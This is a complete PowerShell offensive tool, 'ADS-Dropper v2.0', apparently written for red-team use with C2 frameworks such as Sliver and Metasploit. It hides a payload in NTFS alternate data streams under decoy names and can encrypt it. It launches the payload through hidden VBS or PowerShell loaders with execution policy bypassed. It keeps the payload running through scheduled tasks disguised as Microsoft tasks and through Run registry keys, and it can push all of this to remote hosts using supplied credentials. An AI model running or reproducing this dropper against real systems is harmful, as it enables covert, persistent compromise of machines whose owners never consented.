<#
.SYNOPSIS
    ADS-Dropper v2.0: C2-Agnostic ADS Persistence (Imix/MSF/Sliver/CCDC)
.DESCRIPTION
    Complete implementation with ALL functions fixed.
#>

[CmdletBinding()] param(
    [Parameter(Mandatory)][object]$Payload,
    [string[]]$Targets = @('localhost'),
    [string[]]$Persist = @('task'),
    [switch]$Randomize, [switch]$Encrypt, [switch]$NoExec,
    [PSCredential]$Credential
)

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
Write-Host "Admin: $isAdmin | Encrypt: $Encrypt | Targets: $($Targets -join ', ')| Persist: $($Persist -join ', ')" -ForegroundColor Cyan

function Get-RandomADSConfig {
    $adj = @('Sys','Kernel','Cache','Log','Data','Temp','Boot','User')
    $noun = @('Mgr','Svc','Util','Chk','Idx','Core','Stream','Host')
    $exts = @('.dat','.log','.idx','.tmp','.chk')
    
    # Calculate AES key
    $seed = (Get-CimInstance Win32_ComputerSystemProduct).UUID + $env:COMPUTERNAME
    $sha256 = [System.Security.Cryptography.SHA256]::Create()
    $keyBytes = $sha256.ComputeHash([Text.Encoding]::UTF8.GetBytes($seed))
    
    # Calculate stream name options
    $legitimateStreams = @('Zone.Identifier', 'SmartScreen', 'Catalog', 'appcompat.txt')
    $randomStream = -join (1..8 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 122) })
    
    # Return configuration hashtable
    @{
        HostPath = if($Randomize) { 
            "C:\ProgramData\$(Get-Random -InputObject $adj)$(Get-Random -InputObject $noun)$(Get-Random -InputObject $exts)"
        } else { 
            'C:\ProgramData\SystemCache.dat' 
        }
        
        StreamName = if($Randomize) { 
            ':' + (Get-Random -InputObject ($legitimateStreams + $randomStream))
        } else { 
            ':syc_payload' 
        }
        
        AESKey = [Convert]::ToBase64String($keyBytes)
        
        VBSPrefix = if($Randomize) { 
            'app_log_' + (-join (1..6 | ForEach-Object { [char](Get-Random -Minimum 97 -Maximum 123) })) + '.'
        } else { 
            'app_log_a.' 
        }
    }
}

function ConvertTo-PSPayload($PayloadObj) {
    if($PayloadObj -is [string]) { 
        return $PayloadObj 
    }
    
    if($PayloadObj -is [array]) { 
        $filePath = $PayloadObj[0]
        if(-not (Test-Path $filePath)) {
            throw "Payload file not found: $filePath"
        }
        
        $content = Get-Content $filePath -Raw -Encoding UTF8
        
        # Try to detect if it's Base64-encoded (Imix stagers are often double-encoded)
        try {
            $decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($content))
            # If successful and looks like PowerShell, return decoded
            if($decoded -match '(IEX|Invoke-Expression|Import-Module|New-Object|Get-|Set-|Start-|function\s+\w+|\$\w+\s*=)') {
                Write-Verbose "Detected Base64-encoded PowerShell, using decoded version"
                return $decoded
            }
        } catch {
            # Not Base64, return as-is
        }
        
        return $content
    }
    
    return $PayloadObj.ToString()
}

function Protect-Payload($Payload, $KeyB64) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = [Convert]::FromBase64String($KeyB64)
    $aes.IV = [byte[]](0..15)
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $enc = $aes.CreateEncryptor().TransformFinalBlock([Text.Encoding]::UTF8.GetBytes($Payload), 0, $Payload.Length)
    return [Convert]::ToBase64String($enc)
}

function New-ADSPayload($HostPath, $StreamName, $Payload, $Config) {
    try {
        if(!(Test-Path $HostPath)) { 
            '' | Out-File $HostPath -Encoding ASCII -ErrorAction Stop 
        }
        
        $finalPayload = if($Encrypt) { Protect-Payload $Payload $Config.AESKey } else { $Payload }
        $finalPayload | Out-File "$HostPath$StreamName" -Encoding UTF8 -Force -ErrorAction Stop
        
        Write-Host "ADS Created: $HostPath$StreamName" -ForegroundColor Green
        return "$HostPath$StreamName"
        
    } catch {
        Write-Error "Failed to create ADS: $_"
        throw
    }
}

function New-Loader($ADSPath, $Config) {
    $loaderPath = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'vbs'
    
    if($Encrypt) {
        Write-Warning "AES detected → Using PowerShell loader"
        return New-PSLoader $ADSPath $Config
    }
    
    $vbsContent = @"
On Error Resume Next
Set shell=CreateObject("WScript.Shell"), strm=CreateObject("ADODB.Stream")
strm.Type=2:strm.Charset="utf-8":strm.Open:strm.LoadFromFile("$ADSPath")
payload=strm.ReadText:strm.Close
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"$payload`"",0,False
"@
    $vbsContent | Out-File $loaderPath -Encoding Default -Force
    return $loaderPath
}

function New-PSLoader($ADSPath, $Config) {
    $ps1Path = (Split-Path $ADSPath) + '\' + $Config.VBSPrefix + 'ps1'
    
    # Build decryption code conditionally
    $decryptCode = if($Encrypt) {
        @"
`$aes = [System.Security.Cryptography.Aes]::Create()
`$aes.Key = [Convert]::FromBase64String('$($Config.AESKey)')
`$aes.IV = [byte[]](0..15)
`$dec = `$aes.CreateDecryptor()
`$encBytes = [Convert]::FromBase64String(`$payload)
`$decBytes = `$dec.TransformFinalBlock(`$encBytes, 0, `$encBytes.Length)
`$payload = [Text.Encoding]::UTF8.GetString(`$decBytes)
"@
    } else { "" }
    
    $loader = @"
`$strm = New-Object IO.StreamReader("$ADSPath")
`$payload = `$strm.ReadToEnd()
`$strm.Close()
$decryptCode
Invoke-Expression `$payload
"@
    
    $loader | Out-File $ps1Path -Encoding UTF8 -Force
    return $ps1Path
}

function New-PersistenceMechanism($Type, $LoaderPath, $Config) {
    $taskArgs = "//B `"$LoaderPath`""
    
    switch($Type) {
        'task' {
            if(!$isAdmin) { Write-Warning "Admin required for tasks"; return }
            $taskName = if($Randomize) { "Microsoft\Windows\UX\$((New-Guid).Guid.Split('-')[0])" } 
                       else { "Microsoft\Windows\Customer Experience Improvement Program\UsbCeip" }
            & schtasks /create /tn $taskName /tr "wscript.exe $taskArgs" /sc onlogon /rl highest /f
        }
        'volroot' {
            if(!$isAdmin) { Write-Warning "Admin required for volroot"; return }
            
            $rootADS = "C:\:ads_$((Get-Random -Minimum 1000 -Maximum 9999))"
            
            # Store EXECUTION COMMAND, not loader source
            if($LoaderPath.EndsWith('.vbs')) {
                # For VBS: Store the wscript command
                "wscript.exe //B `"$LoaderPath`"" | Set-Content -Path $rootADS -Force
                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
            } else {
                # For PS1: Store the PowerShell source
                Get-Content $LoaderPath -Raw | Set-Content -Path $rootADS -Force
                $action = "powershell.exe -WindowStyle Hidden -NoProfile -Command `"Get-Content '$rootADS' | Invoke-Expression`""
            }
            
            $taskName = "\Microsoft\Windows\Maintenance\WinSAT_$((Get-Random -Minimum 100 -Maximum 999))"
            & schtasks /create /tn $taskName /tr $action /sc onlogon /rl highest /f | Out-Null
            Write-Verbose "VolRoot ADS: $rootADS -> Task: $taskName"
        }
        'reg' {
            $regPath = if($isAdmin) { 
                "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" 
            } else { 
                "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" 
            }
            
            $valueName = if($Randomize) { 
                "Update_$((Get-Random -Minimum 1000 -Maximum 9999))" 
            } else { 
                "SystemUpdater" 
            }
            
            if(-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            
            Set-ItemProperty -Path $regPath -Name $valueName -Value "wscript.exe $taskArgs" -Force
            Write-Verbose "Registry persistence: $regPath\$valueName"
        }
        default { Write-Warning "Unknown persistence: $Type" }
    }
    Write-Host "Persist [$Type] → $LoaderPath" -ForegroundColor Yellow
}

function Invoke-RemoteDeployment($Target, $PayloadObj, $PersistList, $RandomizeFlag, $EncryptFlag, $NoExecFlag, $Cred) {
    # Serialize each function as a string, separated by newlines
    $allFunctions = @(
        "function Get-RandomADSConfig { $( ${function:Get-RandomADSConfig}.ToString() ) }",
        "function ConvertTo-PSPayload { $( ${function:ConvertTo-PSPayload}.ToString() ) }",
        "function Protect-Payload { $( ${function:Protect-Payload}.ToString() ) }",
        "function New-ADSPayload { $( ${function:New-ADSPayload}.ToString() ) }",
        "function New-Loader { $( ${function:New-Loader}.ToString() ) }",
        "function New-PSLoader { $( ${function:New-PSLoader}.ToString() ) }",
        "function New-PersistenceMechanism { $( ${function:New-PersistenceMechanism}.ToString() ) }"
    ) -join "`n`n"
    
    # Escape single quotes in payload for safe embedding
    $payloadEscaped = $PayloadObj -replace "'","''"
    
    $remoteBlock = [scriptblock]::Create(@"
`$ErrorActionPreference = 'SilentlyContinue'

# Load all functions
$allFunctions

# Execute deployment
`$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
`$Randomize = `$$RandomizeFlag
`$Encrypt = `$$EncryptFlag
`$NoExec = `$$NoExecFlag

# Convert payload
`$rawPayload = ConvertTo-PSPayload '$payloadEscaped'

# Create ADS and loader
`$cfg = Get-RandomADSConfig
`$adsPath = New-ADSPayload `$cfg.HostPath `$cfg.StreamName `$rawPayload `$cfg
`$loaderPath = New-Loader `$adsPath `$cfg

# Set persistence
foreach(`$pType in @('$($PersistList -join "','")')) { 
    New-PersistenceMechanism `$pType `$loaderPath `$cfg 
}

# Execute if requested
if(-not `$NoExec) { 
    if(`$loaderPath.EndsWith('.vbs')) { 
        Start-Process wscript.exe -ArgumentList @('//B', `$loaderPath) -WindowStyle Hidden -NoNewWindow
    } else { 
        Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', `$loaderPath) -WindowStyle Hidden -NoNewWindow
    }
}

return @{ Success = `$true; Artifacts = @{ ADS = `$adsPath; Loader = `$loaderPath } }
"@)
    
    try {
        $result = Invoke-Command -ComputerName $Target -Credential $Cred -ScriptBlock $remoteBlock -ErrorAction Stop
        Write-Host "✅ Remote deployment to $Target succeeded" -ForegroundColor Green
        return $result
    } catch {
        Write-Error "❌ Remote deployment to $Target failed: $_"
        return @{ Success = $false; Error = $_.Exception.Message }
    }
}

foreach($target in $Targets) {
    if($target -eq 'localhost') {
        # LOCAL DEPLOYMENT
        $rawPayload = ConvertTo-PSPayload $Payload
        $cfg = Get-RandomADSConfig
        
        $adsPath = New-ADSPayload $cfg.HostPath $cfg.StreamName $rawPayload $cfg
        $loaderPath = New-Loader $adsPath $cfg
        
        foreach($pType in $Persist) { 
            New-PersistenceMechanism $pType $loaderPath $cfg
        }
        
        if(!$NoExec) { 
            if($loaderPath.EndsWith('.vbs')) { 
                Start-Process wscript.exe -ArgumentList @('//B', $loaderPath) -WindowStyle Hidden -NoNewWindow
            } else { 
                Start-Process powershell.exe -ArgumentList @('-WindowStyle', 'Hidden', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $loaderPath) -WindowStyle Hidden -NoNewWindow
            }
        }
        Write-Host "✅ Local deployment complete" -ForegroundColor Green
    } else {
        # REMOTE DEPLOYMENT
        Write-Host "→ Deploying to $target" -ForegroundColor Magenta
        Invoke-RemoteDeployment $target $Payload $Persist $Randomize.IsPresent $Encrypt.IsPresent $NoExec.IsPresent $Credential
    }
}

Write-Host "`n🎉 ADS-Dropper deployment complete!" -ForegroundColor Green
